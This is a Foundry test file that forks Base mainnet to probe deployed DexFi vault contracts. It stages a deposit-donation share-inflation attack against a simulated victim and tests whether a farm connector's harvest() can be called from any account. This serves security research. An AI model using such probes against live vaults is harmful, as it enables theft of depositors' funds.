// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "../src/Interfaces.sol";

/// @notice Reverse-engineer the DexFi vault share math and test the inflation path.
contract ProbeTest is Test {
    address constant FACTORY = 0xcb34F261a5284554BB9FEa8aA12A0578c4bA3fC6;
    address constant WETH    = 0x4200000000000000000000000000000000000006;
    address constant V3 = 0xE205B423935FA14626b095205C7ADa44DaEB935f; // small vault
    address constant V1 = 0x2AeCe2BE0651baE5e2EF49426060B814E245829c;

    address attacker = address(0xA11CE);
    address victim   = address(0xB0B);

    function setUp() public {
        string memory rpc = vm.envOr("BASE_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = "https://mainnet.base.org";
        vm.createSelectFork(rpc);
    }

    function _log(string memory tag, address v) internal {
        emit log_named_string("---", tag);
        emit log_named_uint("  totalSupply", IDexFiVault(v).totalSupply());
        emit log_named_uint("  vault WETH", IERC20(WETH).balanceOf(v));
        emit log_named_uint("  attacker shares", IDexFiVault(v).balanceOf(attacker));
        emit log_named_uint("  victim shares", IDexFiVault(v).balanceOf(victim));
    }

    function test_probe_share_math() public {
        _log("V3 initial", V3);

        deal(WETH, attacker, 100 ether);
        deal(WETH, victim, 100 ether);

        // 1) attacker tiny deposit
        vm.startPrank(attacker);
        IERC20(WETH).approve(V3, type(uint256).max);
        uint256 aShares = IDexFiVault(V3).deposit(0.05 ether, attacker, 0);
        vm.stopPrank();
        emit log_named_uint("attacker deposit 0.05 WETH -> shares", aShares);
        _log("after attacker deposit", V3);

        // 2) donation
        vm.prank(attacker);
        IERC20(WETH).transfer(V3, 5 ether);
        _log("after donation 5 WETH", V3);

        // 3) victim deposit
        vm.startPrank(victim);
        IERC20(WETH).approve(V3, type(uint256).max);
        uint256 vShares = IDexFiVault(V3).deposit(1 ether, victim, 0);
        vm.stopPrank();
        emit log_named_uint("victim deposit 1 WETH -> shares", vShares);
        _log("after victim deposit", V3);

        // 4) victim immediately exits (does the victim lose?)
        uint256 vBefore = IERC20(WETH).balanceOf(victim);
        vm.prank(victim);
        uint256 vOut = IDexFiVault(V3).withdraw(vShares, victim, 0);
        emit log_named_uint("victim withdraw -> WETH", vOut);
        emit log_named_int("victim net (out-1e18)", int256(IERC20(WETH).balanceOf(victim)) - int256(vBefore) - int256(1 ether) + int256(vOut) - int256(vOut));

        // 5) attacker exits
        uint256 aBefore = IERC20(WETH).balanceOf(attacker);
        vm.prank(attacker);
        uint256 aOut = IDexFiVault(V3).withdraw(aShares, attacker, 0);
        emit log_named_uint("attacker withdraw -> WETH", aOut);
        emit log_named_int("attacker net vs (0.05+5)", int256(IERC20(WETH).balanceOf(attacker)) - int256(aBefore) + int256(aOut) - int256(5.05 ether));
        _log("end", V3);
    }

    // check the farms() struct decoding and connector gating
    function test_probe_farms() public {
        uint256 fc = IDexFiVault(V1).farmsCount();
        emit log_named_uint("V1 farmsCount", fc);
        IDexFiVault.Farm memory f = IDexFiVault(V1).farms(0);
        emit log_named_address("V1 farm0 beacon", f.beacon);
        emit log_named_uint("V1 farm0 percent", f.percent);
        address conn = IDexFiVault(V1).farmConnector(f.beacon);
        emit log_named_address("V1 farm0 connector", conn);
        emit log_named_address("connector.vault()", IDexFiFarm(conn).vault());
        vm.prank(attacker);
        (bool ok, bytes memory ret) = conn.call(abi.encodeWithSignature("harvest()"));
        emit log_named_string("connector.harvest from EOA ok?", ok ? "true" : "false");
        emit log_named_bytes("ret", ret);
    }
}
